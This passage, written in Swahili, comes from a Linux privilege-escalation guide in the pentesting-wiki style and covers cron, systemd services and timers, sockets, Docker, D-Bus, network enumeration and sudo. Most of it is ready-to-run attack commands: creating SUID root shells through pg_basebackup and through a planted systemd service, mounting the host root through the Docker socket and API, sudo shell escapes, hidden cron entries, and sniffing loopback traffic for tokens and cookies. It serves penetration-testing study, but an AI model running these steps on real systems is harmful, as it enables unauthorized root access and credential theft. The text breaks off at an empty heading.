Mtumiaji wa kawaida anayeweza kuandika binary halisi inayoendeshwa na cron job ya root anaweza kuvuka mpaka wa ruhusa, lakini ukaguzi maalum wa saini unaweza kukataa replacement isiyotiwa saini. Katika kisa kilichorekodiwa, ELF inayomilikiwa na root ilikuwa na mode `0760`, hivyo kuruhusu mshiriki wa group yake kuiandika huku mmiliki wa root akiweza kuiendesha. Ufuatiliaji wa mchakato ulioonekana ulionyesha `objcopy` ikitoa `.text_sig` kabla ya job kuendesha binary; script nzima ya verifier haikuweza kusomeka.<sup>[[2]](#references)</sup>

Replacement iliyofaulu ilitiwa saini kwa kutumia nyenzo za siri za kutia saini zilizovuja pamoja na ELF signer. [Nyaraka za format](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) zinaeleza signature section inayotokana na `.text` ya executable. Kuongeza certificate au string inayolingana kwenye `.text_sig` pekee hakujathibitishwa kuwa kunatosha kupita verifier isiyoonekana. Kagua path halisi iliyopangwa, ruhusa halisi za kuandika, uendeshaji wa root na sera ya verifier kabla ya kuhitimisha kuwa binary iliyotiwa saini na inayoweza kuandikwa inaweza kutumiwa vibaya. Section ya `.text_sig` pekee ni kidokezo cha kufanya ukaguzi.

### Kazi za cron zinazojirudia mara kwa mara

Unaweza kufuatilia michakato ili kutafuta michakato inayoendeshwa kila baada ya dakika 1, 2 au 5. Huenda ukaweza kuitumia kujiongezea ruhusa.

Kwa mfano, ili **kufuatilia kila sekunde 0.1 kwa dakika 1**, **kupanga kwa amri zilizoendeshwa mara chache zaidi** na kufuta amri ambazo zimeendeshwa mara nyingi zaidi, unaweza kufanya hivi:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Backups za root zinazohifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inaendesha `pg_basebackup` (au nakala nyingine ya kujirudia) kwenye directory ya database unayoweza kuandika, unaweza kupanda **binary ya SUID/SGID** ambayo itanakiliwa tena kama **root:root**, ikiwa na mode bits zilezile, hadi kwenye matokeo ya backup.<sup>[[26]](#references)</sup>

Mtiririko wa kawaida wa ugunduzi (kama mtumiaji wa DB mwenye ruhusa chache):
- Tumia `pspy` kuona cron ya root ikiendesha kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kuwa cluster ya chanzo (kwa mfano, `/var/lib/postgresql/14/main`) inaweza kuandikiwa na wewe na kwamba lengwa (`/opt/backups/current`) linamilikiwa na root baada ya kazi hiyo.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi biti za mode ya faili inapokili cluster; inapoendeshwa na root, faili lengwa hurithi **umiliki wa root + SUID/SGID iliyochaguliwa na mshambuliaji**. Utaratibu wowote sawa wa backup/copy wenye mapendeleo ya juu unaohifadhi ruhusa na kuandika kwenye eneo linaloweza kutekelezwa uko hatarini.

### Kazi za cron zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya maoni** (bila herufi ya newline), na cron job itafanya kazi. Mfano (angalia herufi ya carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Ili kugundua ingizo hili fiche, kagua faili za cron kwa kutumia zana zinazoonyesha herufi za udhibiti:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Kagua kama unaweza kuandika kwenye faili yoyote ya `.service`. Ukiweza, **unaweza kuirekebisha** ili **itekeleze** **backdoor yako huduma** **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda ukahitaji kusubiri hadi mashine iwashwe upya).\
Kwa mfano, unda backdoor yako ndani ya faili ya .service kwa kutumia **`ExecStart=/tmp/script.sh`**

### Binaries za huduma zinazoweza kuandikwa

Kumbuka kuwa ikiwa una **ruhusa za kuandika kwenye binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha na kuweka backdoors ili backdoors zitekelezwe huduma zinapoanzishwa tena.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa kutumia:

```bash
systemctl show-environment
```

Ukigundua kuwa unaweza **kuandika** katika folda yoyote ya njia hiyo, huenda ukaweza **kuongeza privileges**. Unapaswa kutafuta **relative paths** zinazotumika katika faili za mipangilio ya service kama vile:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Kisha, unda **faili linaloweza kutekelezwa** lenye **jina sawa na binary ya relative path** ndani ya folda ya systemd PATH unayoweza kuandika, na huduma inapoombwa kutekeleza kitendo hatarishi (**Start**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (watumiaji wasio na privileged access kwa kawaida hawawezi kuanzisha/kusimamisha huduma, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Vipima-muda**

**Vipima-muda** ni faili za systemd unit ambazo majina yake huishia kwa `**.timer**` na hudhibiti faili za `**.service**` au matukio. **Vipima-muda** vinaweza kutumika badala ya cron kwa kuwa vina uwezo wa ndani wa kushughulikia matukio ya muda wa kalenda na matukio ya muda wa monotonic, na vinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha vipima-muda vyote kwa:

```bash
systemctl list-timers --all
```

### Vipima muda vinavyoweza kuandikwa

Ukiweza kurekebisha kipima muda, unaweza kukifanya kitekeleze baadhi ya units za systemd.unit (kama `.service` au `.target`)

```bash
Unit=backdoor.service
```

Katika documentation unaweza kusoma kuhusu Unit:

> Unit itakayoanzishwa timer hii inapomaliza muda. Argument ni jina la unit, ambalo suffix yake si ".timer". Lisipobainishwa, thamani hii huwa service yenye jina sawa na timer unit, isipokuwa suffix. (Tazama hapo juu.) Inapendekezwa kuwa unit name inayoanzishwa na unit name ya timer unit ziwe na majina yanayofanana, isipokuwa suffix.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Kutafuta systemd unit fulani (kama `.service`) ambayo **inaendesha binary inayoweza kuandikwa**
- Kutafuta systemd unit fulani ambayo **inaendesha relative path** na una **ruhusa za kuandika** kwenye **systemd PATH** (ili kujifanya kuwa executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwasha timer unahitaji root privileges na kutekeleza:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Kumbuka kuwa **timer** **huwashwa** kwa kuunda symlink yake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya michakato** kwenye mashine moja au tofauti, ndani ya miundo ya client-server. Hutumia faili za kawaida za descriptor za Unix kwa mawasiliano kati ya kompyuta na husanidiwa kupitia faili za `.socket`.<sup>[[14]](#references)</sup>

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets ukitumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa muhimu vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi hutofautiana, lakini kwa muhtasari **huonyesha mahali itakaposikiliza** socket (njia ya faili ya socket ya AF_UNIX, IPv4/6 na/au nambari ya port itakayosikilizwa, n.k.)
- `Accept`: Huchukua thamani ya boolean. Ikiwa ni **true**, **service instance huanzishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndiyo hupitishwa kwake. Ikiwa ni **false**, sockets zote zinazosikiliza **hupitishwa zenyewe kwa service unit inayoanzishwa**, na service unit moja tu huanzishwa kwa miunganisho yote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs ambapo service unit moja hushughulikia trafiki yote inayoingia bila masharti. **Thamani chaguomsingi ni false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa namna inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Huchukua mstari mmoja au zaidi wa amri, ambazo **hutekelezwa kabla** au **baada ya** **sockets**/FIFOs zinazosikiliza **kuundwa** na kuunganishwa, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **hutekelezwa kabla** au **baada ya** **sockets**/FIFOs zinazosikiliza **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la **service** unit **litakaloanzishwa** panapokuwa na **trafiki inayoingia**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Kwa chaguomsingi, hutumia service yenye jina sawa na socket (lakini kiambishi tamati hubadilishwa). Katika hali nyingi, si lazima kutumia chaguo hili.

### Faili za .socket zinazoweza kuandikwa

Ukipata faili ya `.socket` **inayoweza kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor`, na backdoor itatekelezwa kabla ya socket kuundwa. Kwa hivyo, huenda **utahitaji kusubiri hadi mashine iwashwe upya.**\
_Kumbuka kuwa mfumo lazima uwe unatumia usanidi huo wa faili ya socket, la sivyo backdoor haitatekelezwa_

### Uwashaji wa socket + njia ya unit inayoweza kuandikwa (unda service inayokosekana)

Usanidi mwingine usio salama wenye athari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit inayorejelewa haipo
- mshambulizi anaweza kuandika kwenye `/etc/systemd/system` (au njia nyingine ya utafutaji wa unit)

Katika hali hiyo, mshambulizi anaweza kuunda `<name>.service`, kisha kuchochea trafiki kwenye socket ili systemd ipakie na kutekeleza service mpya kama root.

Hatua za haraka:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets Zinazoweza Kuandikiwa

Uki **tambua socket yoyote inayoweza kuandikiwa** (_hapa tunazungumzia Unix Sockets, si faili za usanidi za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na pengine kutumia vulnerability.

### Enumerate Unix Sockets

```bash
netstat -a -p --unix
```

### Muunganisho ghafi

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Mfano wa exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Soketi za HTTP

Kumbuka kwamba huenda kukawa na **soketi zinazosikiliza maombi ya HTTP** (_simaanishi faili za .socket, bali faili zinazofanya kazi kama soketi za unix_). Unaweza kuangalia hili kwa kutumia:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ikiwa socket **itajibu kwa HTTP** request, basi unaweza **kuwasiliana** nayo na pengine **kutumia exploit kwa vulnerability fulani**.

### Docker Socket Inayoweza Kuandikiwa

Docker socket, ambayo mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguomsingi, mtumiaji wa `root` na washiriki wa kundi la `docker` wanaweza kuiandikia. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hivi ndivyo inavyoweza kufanywa, pamoja na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation kwa kutumia Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza kufanya privilege escalation kwa kutumia amri zifuatazo:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Amri hizi zinakuruhusu kuendesha container yenye ufikiaji wa kiwango cha root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, Docker socket bado inaweza kutumiwa vibaya kupitia HTTP ghafi kwenye Unix socket. Mchakato unaotegemewa zaidi ni:

- kuunda helper container inayodumu kwa muda mrefu huku root ya host ikiwa imewekwa kama bind mount
- kuianzisha
- kuunda instance ya `exec` ndani ya helper hiyo
- kuanzisha instance ya `exec` na kusoma matokeo kupitia API

**Orodhesha Docker images**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Unda na uwashe kontena saidizi**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Unda instance ya exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Anzisha exec instance na usome matokeo**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Muundo huu kwa kawaida ni thabiti zaidi kuliko kujaribu kuendesha `attach` mwenyewe kwa `socat` au `nc -U`. Mara tu unapoweza kuunda helper kwa kutumia `/:/host`, unaweza kutumia instances za ziada za `exec` kusoma faili kama `/host/root/...`, kuongeza SSH keys chini ya `/host/root/.ssh`, au kurekebisha faili za uanzishaji za host.

### Nyingine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu **uko ndani ya kundi la `docker`**, kuna [**njia zaidi za kuongeza privileges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port**, unaweza pia kuikompromiti](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoka kwenye containers au kutumia vibaya container runtimes ili kuongeza privileges** hapa:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Kuongeza privileges kupitia Containerd (ctr)

Ukipata kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa kuwa **unaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Kuongeza privileges kupitia **RunC**

Ukipata kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa kuwa **unaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni **mfumo wa Inter-Process Communication (IPC)** wa hali ya juu unaowezesha applications kuwasiliana na kushiriki data kwa ufanisi. Ukiwa umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, unatoa mfumo imara unaowezesha aina mbalimbali za mawasiliano kati ya applications.<sup>[[16]](#references)</sup>

Mfumo huu una uwezo mbalimbali na unaunga mkono IPC ya msingi inayoboresha ubadilishanaji wa data kati ya processes, sawa na **UNIX domain sockets zilizoboreshwa**. Pia husaidia kutangaza events au signals, na hivyo kuwezesha muunganisho usio na vikwazo kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia inaweza kusababisha music player kunyamazisha sauti, na hivyo kuboresha matumizi ya mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, unaorahisisha maombi ya huduma na miito ya method kati ya applications, na kurahisisha processes ambazo kwa kawaida zilikuwa changamano.

D-Bus hufanya kazi kwa kutumia **modeli ya kuruhusu/kukataa**, inayodhibiti ruhusa za ujumbe (miito ya method, utumaji wa signals, n.k.) kulingana na athari ya jumla ya policy rules zinazolingana. Policies hizi hubainisha mwingiliano na bus, na huenda zikaruhusu kuongeza privileges kwa kutumia vibaya ruhusa hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukieleza ruhusa za mtumiaji root kumiliki, kutuma ujumbe kwa, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Policies zisizobainisha mtumiaji au kundi hutumika kwa wote, ilhali policies za muktadha wa "default" hutumika kwa wote ambao hawajashughulikiwa na policies nyingine mahususi.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima inavutia ku-enumerate mtandao na kubaini nafasi ya mashine.

### Enumeration ya jumla

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ikiwa ingizo linalotumika la `/etc/inetd.conf` linaendesha GNU Inetutils `telnetd` kama root, kagua toleo la binary lililosanidiwa na listener ya ndani hata kama port imefungwa kwenye loopback pekee. GNU Inetutils 1.9.3 hadi 2.7 zilikuwa na [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) ambapo `USER` iliyotumwa na client ilifikishwa kwa `login -f` (CVE-2026-24061). Mchakato au mfuatano wa toleo ni dalili; thibitisha hali ya viraka vya vendor na daemon halisi kabla ya kuhitimisha kuwa iko hatarini. [Mwongozo wa Telnet](../../../network-services-pentesting/pentesting-telnet.md) una maelezo zaidi.

### Uchunguzi wa haraka wa uchujaji wa trafiki inayotoka

Ikiwa host inaweza kutekeleza amri lakini callbacks zinashindwa, tofautisha haraka uchujaji wa DNS, transport, proxy na route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Porti zilizo wazi

Daima angalia huduma za mtandao zinazoendeshwa kwenye mashine ambayo hukuweza kuingiliana nayo kabla ya kupata ufikiaji wake:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Panga listeners kulingana na bind target:

- `0.0.0.0` / `[::]`: zimefichuliwa kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: za ndani pekee (zinafaa kwa tunnel/forward).
- IP maalum za ndani (k.m. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinaweza kufikiwa tu kutoka sehemu za ndani.

### Mtiririko wa kazi wa kuchunguza huduma za ndani pekee

Unapocompromise host, huduma zilizofungwa kwenye `127.0.0.1` mara nyingi huwa zinaweza kufikiwa kwa mara ya kwanza kutoka kwenye shell yako. Mtiririko wa haraka wa kazi wa ndani ni:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kama kichanganuzi cha mtandao (hali ya mtandao pekee)

Mbali na ukaguzi wa ndani wa PE, linPEAS inaweza kufanya kazi kama kichanganuzi maalum cha mtandao. Hutumia binaries zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi zana.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama kichanganuzi cha mtandao pekee (huruka ukaguzi mwingine wa privilege escalation).

### Sniffing

Angalia kama unaweza kunasa trafiki. Ukiweza, unaweza kupata credentials.

```
timeout 1 tcpdump
```

Ukaguzi wa haraka wa vitendo:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee hufichua tokens/cookies/credentials hapo:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Capture sasa, parse baadaye:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Watumiaji

### Uhesabuji wa Jumla

Kagua **wewe ni nani**, una **ruhusa** zipi, ni **watumiaji** gani waliopo kwenye mifumo, ni watumiaji gani wanaoweza **login** na ni nani walio na **ruhusa za root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha haki za ufikiaji. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Itumie kufanya exploit** kwa kutumia: **`systemd-run -t /bin/bash`**

### Makundi

Angalia kama wewe ni **mwanachama wa kundi fulani** linaloweza kukupa haki za root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia kwenye ubao wa kunakili (ikiwezekana)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Sera ya Nenosiri

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Nywila zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa hujali kusababisha kelele nyingi na kompyuta ina programu za `su` na `timeout`, unaweza kujaribu kumfanyia mtumiaji brute-force kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye kigezo cha `-a` pia hujaribu kuwafanyia watumiaji brute-force.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ukigundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH**, huenda ukaweza kuongeza mamlaka kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** na kuipa jina la amri itakayoendeshwa na mtumiaji mwingine (ikiwezekana root), ambayo **haipakuliwi kutoka kwenye folda iliyo kabla ya folda yako inayoweza kuandikwa katika $PATH**.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo, au amri hizo zinaweza kuwa na bit ya suid. Iangalie kwa kutumia:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri**.<sup>[[8]](#references)</sup> Kwa mfano:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Katika mfano huu, mtumiaji `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi sana kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita `sh`.

```
sudo vim -c '!sh'
```

### Ulinganisho wa Bash usio na alama za kunukuu kwenye script ya sudo

Katika Bash, upande wa kulia wa `[[ "$protected" == $candidate ]]` ni pattern. Ikiwa script ya sudo yenye uwezo wa root inajaza `candidate` kutoka kwenye faili inayodhibitiwa na mwitaji, thamani kama `prefix*` inaweza kulingana na mwanzo wa string iliyolindwa. Njia tofauti za mafanikio na hitilafu zinaweza kisha kufichua prefix oracle. Weka alama za kunukuu kwenye upande wa kulia (`[[ "$protected" == "$candidate" ]]`) ikiwa unakusudia ulinganifu halisi. Kagua hoja halisi za sudo, chanzo cha ingizo na tabia ya matawi inayoonekana kabla ya kuhitimisha kuwa ulinganisho usio na alama za kunukuu unaweza kutumiwa vibaya. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) inaeleza tabia hii ya pattern.

### Faili za mradi za PrusaSlicer zinapoendeshwa kupitia sudo

